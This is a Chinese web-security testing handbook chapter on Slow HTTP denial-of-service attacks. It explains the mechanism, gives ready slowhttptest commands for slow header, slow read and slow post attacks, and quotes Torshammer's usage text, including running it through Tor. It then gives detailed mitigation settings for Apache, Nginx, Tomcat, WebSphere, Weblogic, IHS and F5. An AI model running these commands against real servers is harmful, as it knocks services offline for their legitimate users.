# Slow HTTP DOS #
[Slow HTTP DOS](http://payloads.online/archivers/2018-04-16/2"Slow HTTP DOS")
《Web安全测试学习手册》- Slow HTTP DOS
## 0x00 Slow HTTP DOS - 介绍 ##
### 1）什么是Slow HTTP DOS ###
Slow HTTP DOS(Slow HTTP Denial of Service Attack)，译为缓慢的HTTP拒绝服务，这类攻击方式出现在许多公开协议中。
### 2）Slow HTTP DOS的特点 ###
Slow HTTP DOS是一个应用层拒绝服务攻击，主要针对协议为HTTP，攻击的成本很低，并且能够消耗服务器端资源，占用客户端连接数，导致正常用户无法连接服务器。
## 0x01 Slow HTTP DOS - 风险等级 ##
中
## 0x02 Slow HTTP DOS - 原理 ##
既然是一个HTTP协议的缓慢攻击，这就要从HTTP协议说起了。
首先HTTP协议的报文都是一行一行的，类似于：
```txt
GET / HTTP/1.1\r\n
Host : payloads.online\r\n
Connection: keep-alive\r\n
Keep-Alive: 900\r\n
Content-Length: 100000000\r\n
Content_Type: application/x-www-form-urlencoded\r\n
Accept: *.*\r\n
\r\n
```
那么报文中的`\r\n`是什么？
`\r\n`代表一行报文的结束也被称为空行（CRLF），而`\r\n\r\n`代表整个报文的结束
从上面贴出的`GET`请求包可以看出，我们的客户端请求到服务器后，告知服务器这个连接需要保留。
通常我们知道HTTP协议采用“请求-应答”模式，当使用普通模式，即非KeepAlive模式时，每个请求/应答客户和服务器都要新建一个连接，完成之后立即断开连接`（HTTP协议为无连接的协议）`；当使用`Keep-Alive模式（又称持久连接、连接重用）`时，Keep-Alive功能使客户端到服 务器端的连接持续有效，当出现对服务器的后继请求时，Keep-Alive功能避免了建立或者重新建立连接。
那么当我们客户端发送一个报文，不以`CRLF`结尾，而是10s发送一行报文，我们的报文需要80s才能发送完毕，这80s内，服务器需要一直等待客户端的CRLF，然后才能解析这个报文。
如果客户端使用更多的程序发送这样的报文，那么服务器端会给客户端留出更多的资源来处理、等待这迟迟不传完的报文。假设服务器端的客户端最大连接数是100个，我们使用测试程序先连接上100次服务器端，并且报文中启用Keep-Alive，那么其他正常用户101、102就无法正常访问网站了。
## 0x03 Slow HTTP DOS - 常见场景 ##
大多出现在默认安装好的Apache Web中，未合理设置客户端连接数导致的。
## 0x04 测试方案 ##
使用Slow HTTP Test 工具进行检测
Kali Linux 安装 ：
```txt
apt-get install slowhttptest
```
SlowHTTPTest是一个可配置的应用层拒绝服务攻击测试攻击，它可以工作在Linux，OSX和Cygwin环境以及Windows命令行接口，可以帮助安全测试人员检验服务器对慢速攻击的处理能力。
这个工具可以模拟低带宽耗费下的DoS攻击，比如慢速攻击，慢速HTTP POST，通过并发连接池进行的慢速读攻击（基于TCP持久时间）等。慢速攻击基于HTTP协议，通过精心的设计和构造，这种特殊的请求包会造成服务器延时，而当服务器负载能力消耗过大即会导致拒绝服务。
### Slow Header ###
```txt
slowhttptest -c 65500 -H -i 10 -r 200 -s 8192 -t SLOWHEADER -u http://payloads.online
```
该攻击会像我们刚才讲的慢速传递HTTP报文，占用服务器资源让其等待我们最后的CRLF。
### Slow Read ###
```txt
slowhttptest -c 65500 -X -r 1000 -w 10 -y 20 -t SLOWREAD -n 5 -z 32 -u http://payloads.online
```
该攻击会在Web服务器响应内容传输回来的时候，我们客户端缓慢的读取响应报文，这样服务器端也会一直等待客户端来接收完毕。
### Slow Post ###
```txt
slowhttptest -c 65500 -B -i 10 -r 200 -s 8192 -t SLOWBODY -u http://payloads.online
```
该攻击会构造一个POST数据包，将数据缓慢传输，使服务器端一直等待接收报文。
### 测试工具 ###
#### Torshammer ####
[Torshammer](https://sourceforge.net/projects/torshammer/files/Torshammer/1.0/"Torshammer")
```txt
INFO

Version: 1.0 Beta
Home page: http://torshammer.sourceforge.net
Project page: https://sourceforge.net/projects/torshammer

Tor's Hammer is a slow post dos testing tool written in Python. It can also be run through the Tor network to be anonymized. If you are going to run it with Tor it assumes you are running Tor on 127.0.0.1:9050. Kills most unprotected web servers running Apache and IIS via a single instance. Kills Apache 1.X and older IIS with ~128 threads, newer IIS and Apache 2.X with ~256 threads.

------------------------------------------------------------------------

REQUIREMENTS:

This tool is cross-platform because is written in Python. You only need to have python installed on your operating system.

Python page: http://www.python.org
Download page: http://www.python.org/download

------------------------------------------------------------------------

USAGE:

./torshammer.py -t <target> [-r <threads> -p <port> -T -h]
-t|--target <Hostname|IP>
-r|--threads <Number of threads> Defaults to 256
-p|--port <Web Server Port> Defaults to 80
-T|--tor Enable anonymising through tor on 127.0.0.1:9050
-h|--help Shows this help

Eg. ./torshammer.py -t 192.168.1.100 -r 256

------------------------------------------------------------------------
```
#### SlowHTTPTest ####
[SlowHTTPTest](https://github.com/shekyan/slowhttptest/releases"SlowHTTPTest")
```txt
InstallationAndUsage
Sergey Shekyan edited this page on 5 Jul 2017 · 6 revisions
Installation
The tool is distributed as portable package, so just download the latest tarball from Releases section, extract, configure, compile, and install:

$ tar -xzvf slowhttptest-x.x.tar.gz

$ cd slowhttptest-x.x

$ ./configure --prefix=PREFIX

$ make

$ sudo make install
Where PREFIX must be replaced with the absolute path where slowhttptest tool should be installed.

You need libssl-dev to be installed to successfully compile the tool. Most systems would have it. On OS X, run brew install openssl && brew link openssl --force, if g++ fails to locate ssl.h, run xcode-select --install.

Running slowhttptest in Docker
The included Dockerfile allows you to build slowhttptest in a containerized Docker environment to avoid polluting your system with development dependencies. You can also use the Docker container for deploying slowhttptest to Kubernetes (Job), Mesos/DCOS (Task), Docker Swarm, etc... if that suites your needs.

Build the docker container: docker build -t slowhttptest:latest .
Run the docker container: docker run slowhttptest:latest <slowhttptest args>
If you make changes to the source, just re-run the steps and the changes will generate a new container with the updated binary inside the container.

If you don't want to run "docker run" over and over... you can get an interactive shell: docker run -ti --entrypoint sh slowhttptest:latest then run slowhttptest (it's in the path).

Alternatively

MacOS
Using Homebrew: brew update && brew install slowhttptest

Linux
Try your favorite package manager, some of them are aware of slowhttptest.

Usage
Tool works out-of-the-box with default parameters, which are harmless and most likely will not cause a Denial of Service. Type

$ PREFIX/bin/slowhttptest
and test begins with the following default parameters:

test type	SLOW HEADERS
number of connections	50
URL	http://localhost/
verb	GET
interval between follow up data	10 seconds
connections per second	50
test duration	240 seconds
probe connection timeout	5 seconds
max length of followup data field	32 bytes
Every connection generates an initial request containing:

GET / HTTP/1.1
Host: localhost:80
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2)
Where user-agent is being randomly picked from hard-coded list of user-agent strings, and remains the same for entire test.

Then, every 10 seconds a follow up header with random name and value each not greater than 32 bytes is being sent:

X-HMzV2bwpzQw9jU9fGjIJyZRknd7Sa54J: u6RrIoLRrte4QV92yojeewiuDa9BL2N7
.
. 10 seconds
.
X-nq0HRGnv1W: T5dSL
.
. 10 seconds
.
X-iFrjuN: PdR7Jcj27P
.
.
Repeated until server closes the connection or test hits time limit, 240 seconds in this case. There is a Probe socket, which connects every second and takes a probe of web server availability by sending complete GET request. If server responds within probe connection timeout interval (specified by -p argument), server is considered available, otherwise it's considered DoSed. Default value of 5 seconds might be not enough for slow servers, or if SSL connection is being used, so appropriate value should be around average response time of the server.

Full list of configurable options is the following:

option	description
-a start	start value of ranges-specifier for range header test
-b bytes	limit of range-specifier for range header test
-c number of connections	limited to 65539
-d proxy host:port	for directing all traffic through web proxy
-e proxy host:port	for directing only probe traffic through web proxy
-H, B, R or X	specify to slow down in headers section or in message body, -R enables range test, -X enables slow read test
-f content-type	value of Content-type header
-g	generate statistics in CSV and HTML formats, pattern is slow_xxx.csv/html, where xxx is the time and date
-i seconds	interval between follow up data in seconds, per connection
-k pipeline factor	number of times to repeat the request in the same connection for slow read test if server supports HTTP pipe-lining.
-l seconds	test duration in seconds
-m accept	value of Accept header
-n seconds	interval between read operations from receive buffer
-o file	custom output file path and/or name, effective if -g is specified
-p seconds	timeout to wait for HTTP response on probe connection, after which server is considered inaccessible
-r connections per second	connection rate
-s bytes	value of Content-Length header, if -B specified
-t verb	custom verb to use
-u URL	target URL, the same format you type in browser, e.g https://host[:port]/
-v level	verbosity level of log 0-4
-w bytes	start of range the advertised window size would be picked from
-x bytes	max length of follow up data
-y bytes	end of range the advertised window size would be picked from
-z bytes	bytes to read from receive buffer with single read() operation
Example of usage in slow message body mode:

./slowhttptest -c 1000 -B -g -o my_body_stats -i 110 -r 200 -s 8192 -t FAKEVERB -u https://myseceureserver/resources/loginform.html -x 10 -p 3
Example of usage in slowloris mode:

./slowhttptest -c 1000 -H -g -o my_header_stats -i 10 -r 200 -t GET -u https://myseceureserver/resources/index.html -x 24 -p 3
Example of usage in slow read mode with probing through proxy at x.x.x.x:8080 to have website availability from IP different than yours:

./slowhttptest -c 1000 -X -r 1000 -w 10 -y 20 -n 5 -z 32 -u http://someserver/somebigresource -p 5 -l 350 -e x.x.x.x:8080
Output
Depends on verbosity level, output can be either as simple as heartbeat message generated every 5 seconds showing status of connections with verbosity level 1, or full traffic dump with verbosity level 4.

-g option would generate both CSV file and interactive HTML based on Google Chart Tools.
```
## 0x05 修复方案 ##
- 1.设置合适的 timeout 时间（Apache 已默认启用了 reqtimeout 模块），规定了 Header 发送的时间以及频率和 Body 发送的时间以及频率
- 2.增大 MaxClients(MaxRequestWorkers)：增加最大的连接数。根据官方文档，两个参数是一回事，版本不同，MaxRequestWorkers was called MaxClients before version 2.3.13. The old name is still supported.
- 3.默认安装的 Apache 存在 Slow Attack 的威胁，原因就是虽然设置的 timeoute，但是最大连接数不够，如果攻击的请求频率足够大，仍然会占满 Apache 的所有连接
针对不同的Server其对慢速http拒绝服务攻击防范方法也不同，建议使用以下措施防范慢速http拒绝服务攻击：
### WebSphere ###
- 1、限制 HTTP 数据的大小 在WebSphere Application Server 中进行如下设置：
任何单个 HTTP 头的默认最大大小为 32768 字节。可以将它设置为不同的值。
HTTP 头的默认最大数量为 50。可以将它设置为不同的限制值。
另一种常见的 DOS 攻击是发送一个请求，这个请求会导致一个长期运行的 GET 请求。WebSphere Application Server Plug-in 中的 ServerIOTimeoutRetry 属性可限制任何请求的重试数量。这可以降低这种长期运行的请求的影响。
设置限制任何请求正文的最大大小。详见参考链接。
- 2、设置keepalive参数
打开ibm http server安装目录，打开文件夹conf，打开文件httpd.conf,查找KeepAlive值，改ON为OFF,其默认为ON。
这个值说明是否保持客户与HTTP SERVER的连接，如果设置为ON，则请求数到达MaxKeepAliveRequests设定值时请求将排队，导致响应变慢。
### Weblogic ###
- 1、在配置管理界面中的协议->一般信息下设置 完成消息超时时间小于400
- 2、在配置管理界面中的协议->HTTP下设置 POST 超时、持续时间、最大 POST 大小为安全值范围。
### Nginx ###
- 1、通过调整$request_method，配置服务器接受http包的操作限制；
- 2、在保证业务不受影响的前提下，调整client_max_body_size, client_body_buffer_size, client_header_buffer_size,large_client_header_buffersclient_body_timeout, client_header_timeout的值，必要时可以适当的增加；
- 3、对于会话或者相同的ip地址，可以使用HttpLimitReqModule and HttpLimitZoneModule参数去限制请求量或者并发连接数；
- 4、根据CPU和负载的大小，来配置worker_processes 和 worker_connections的值，公式是：max_clients = worker_processes * worker_connections。
### Apache ###
建议使用mod_reqtimeout和mod_qos两个模块相互配合来防护。
- 1、mod_reqtimeout用于控制每个连接上请求发送的速率。配置例如： #请求头部分，设置超时时间初始为10秒，并在收到客户端发送的数据后，每接收到500字节数据就将超时时间延长1秒，但最长不超过40秒。可以防护slowloris型的慢速攻击。 RequestReadTimeout header=10-40,minrate=500 #请求正文部分，设置超时时间初始为10秒，并在收到客户端发送的数据后，每接收到500字节数据就将超时时间延长1秒，但最长不超过40秒。可以防护slow message body型的慢速攻击。 RequestReadTimeout body=10-40,minrate=500 需注意，对于HTTPS站点，需要把初始超时时间上调，比如调整到20秒。
- 2、mod_qos用于控制并发连接数。配置例如：
当服务器并发连接数超过600时，关闭keepalive
QS_SrvMaxConnClose 600
限制每个源IP最大并发连接数为50
QS_SrvMaxConnPerIP 50 这两个数值可以根据服务器的性能调整。
### IHS服务器 ###
请您先安装最新补丁包，然后启用`mod_reqtimeout`模块，在配置文件中加入：
```txt
LoadModule reqtimeout_module modules/mod_reqtimeout.so
```
为`mod_reqtimeout`模块添加配置：
```txt
<IfModule mod_reqtimeout.c>
RequestReadTimeout header=10-40,MinRate=500 body=10-40,MinRate=500
</IfModule>
```
对于HTTPS站点，建议header=20-40,MinRate=500。
- 参见：http://www-01.ibm.com/support/docview.wss?uid=swg21652165
### F5负载均衡修复建议 ###
F5负载均衡设备有相应的防护模块，如无购买可参考附件中的详细配置过程。
关于F5的慢速攻击防护配置，请参考以下链接：
- https://support.f5.com/kb/en-us/solutions/public/10000/200/sol10260.html
- https://devcentral.f5.com/articles/mitigating-slow-http-post-ddos-attacks-with-irules-ndash-follow-up
### tomcat服务器 ###
解决方案：
- 1、设置Tomcat / server.xml文件 connectiontimeout 值，默认为20000ms，修改为8000ms(Tomcat 自身安全漏洞)
- 2、设置AJAX的全局timeout时间（默认为30000ms） $.ajaxSetup({timeout:8000}).
感谢Wingkyun给予我的修复建议